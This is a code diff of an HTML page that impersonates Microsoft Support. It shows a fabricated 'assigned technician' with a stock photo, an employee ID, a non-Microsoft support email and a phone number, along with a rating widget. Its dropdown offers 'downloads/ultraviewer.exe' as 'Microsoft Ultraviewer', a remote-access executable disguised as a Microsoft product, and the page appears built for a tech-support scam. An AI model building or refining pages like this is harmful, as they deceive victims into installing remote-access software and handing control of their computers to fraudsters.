@@ -10,7 +10,6 @@
       background: linear-gradient(to bottom right, #f3f6fa, #ffffff);
     }
 
-    /* Header Styling */
     .header {
       padding: 15px 40px;
       display: flex;
@@ -85,7 +84,6 @@
       background-color: #f0f0f0;
     }
 
-    /* Main Content */
     .main {
       display: flex;
       justify-content: center;
@@ -97,9 +95,22 @@
       background: #ffffff;
       border-radius: 12px;
       box-shadow: 0 4px 25px rgba(0, 0, 0, 0.1);
-      width: 450px;
+      width: 850px;
       padding: 35px 30px;
+      display: flex;
+      flex-direction: row;
+      gap: 20px;
+      animation: fadeIn 1.2s ease-in-out;
+    }
+
+    .left-section {
+      flex: 2;
+    }
+
+    .right-section-feedback {
+      flex: 1;
       text-align: center;
+      animation: fadeIn 1.4s ease-in-out;
     }
 
     .case-id {
@@ -135,10 +146,6 @@
       color: #0078d4;
     }
 
-    .feedback {
-      margin-top: 30px;
-    }
-
     .stars span {
       font-size: 26px;
       cursor: pointer;
@@ -153,15 +160,33 @@
       margin-top: 30px;
       font-size: 13px;
       color: #999;
+      text-align: center;
+    }
+
+    .modal {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      background: white;
+      padding: 20px 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      z-index: 100;
+      animation: fadeIn 0.3s ease-in-out;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
     }
   </style>
 </head>
 <body>
-
-  <!-- Header with Dropdown -->
   <div class="header">
     <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="Microsoft Logo" class="logo">
-
     <div class="nav-links">
       <button class="dropdown-btn" onclick="toggleDropdown()">Products ▾</button>
       <div id="dropdown" class="dropdown-content">
@@ -170,36 +195,34 @@
         <a href="downloads/ultraviewer.exe" download>Microsoft Ultraviewer (Free Service Enabled)</a>
       </div>
       <a href="#">Support</a>
-      <a href="#">Contact Us</a>
+      <a href="#">Help</a>
+      <a href="#">Login</a>
     </div>
-
     <div class="right-section">
       <input type="text" placeholder="Search..." class="search-box">
       <img src="https://cdn-icons-png.flaticon.com/512/3135/3135715.png" alt="Profile" class="profile-icon">
     </div>
   </div>
 
-  <!-- Main Content -->
   <div class="main">
     <div class="card">
-      <div class="case-id">Case ID: 675223</div>
-
-      <img class="profile-pic" src="https://randomuser.me/api/portraits/men/30.jpg" alt="David Cook">
-      
-      <h2>Technician Assigned: David Cook</h2>
-
-      <div class="details">
-        <p><strong>Employee ID:</strong> MC20230675</p>
-        <p><strong>D.O.B:</strong> March 12, 1990</p>
-        <p><strong>Work Experience:</strong> 8 Years</p>
-        <p><strong>Specialized Field:</strong> Network Troubleshooting & Remote Support</p>
-        <p><strong>Joining Date:</strong> July 5, 2016</p>
-        <p><strong>Email:</strong> david.cook@microsoftsupport.com</p>
-        <p><strong>Support Number:</strong> +1 206 279 9715</p>
+      <div class="left-section">
+        <div class="case-id">Case ID: 675223</div>
+        <img class="profile-pic" src="https://randomuser.me/api/portraits/men/34.jpg" alt="David Cook">
+        <h2>Technician Assigned: David Cook</h2>
+        <div class="details">
+          <p><strong>Employee ID:</strong> MC20230675</p>
+          <p><strong>D.O.B:</strong> March 12, 1990</p>
+          <p><strong>Work Experience:</strong> 8 Years</p>
+          <p><strong>Specialized Field:</strong> Network Troubleshooting & Remote Support</p>
+          <p><strong>Joining Date:</strong> July 5, 2016</p>
+          <p><strong>Email:</strong> david.cook@microsoftsupport.com</p>
+          <p><strong>Support Number:</strong> +1 206 279 9715</p>
+        </div>
       </div>
-
-      <div class="feedback">
-        <h3>Rate Your Support</h3>
+      <div class="right-section-feedback">
+        <p style="font-size: 14px; color: #333;">You can rate your technician service once the case is resolved</p>
+        <h3>Rate Support</h3>
         <div class="stars">
           <span onclick="rate(1)">★</span>
           <span onclick="rate(2)">★</span>
@@ -209,9 +232,15 @@
         </div>
         <p id="rating-msg" style="margin-top:10px; font-size:14px; color:green;"></p>
       </div>
-
-      <div class="footer">Microsoft Support | All rights reserved</div>
     </div>
+  </div>
+
+  <div class="modal" id="thankYouModal">
+    <p style="margin: 0; font-size: 16px;">⭐ Thank you for rating the technician!</p>
+  </div>
+
+  <div class="footer">
+    &copy; 2025 Microsoft Support | All rights reserved
   </div>
 
   <script>
@@ -226,9 +255,12 @@
         el.classList.toggle('selected', index < stars);
       });
       document.getElementById("rating-msg").innerText = `You rated this ${stars} star${stars > 1 ? 's' : ''}. Thank you!`;
+      document.getElementById("thankYouModal").style.display = "block";
+      setTimeout(() => {
+        document.getElementById("thankYouModal").style.display = "none";
+      }, 2000);
     }
 
-    // Close dropdown if clicked outside
     window.onclick = function(event) {
       if (!event.target.matches('.dropdown-btn')) {
         const dropdown = document.getElementById("dropdown");
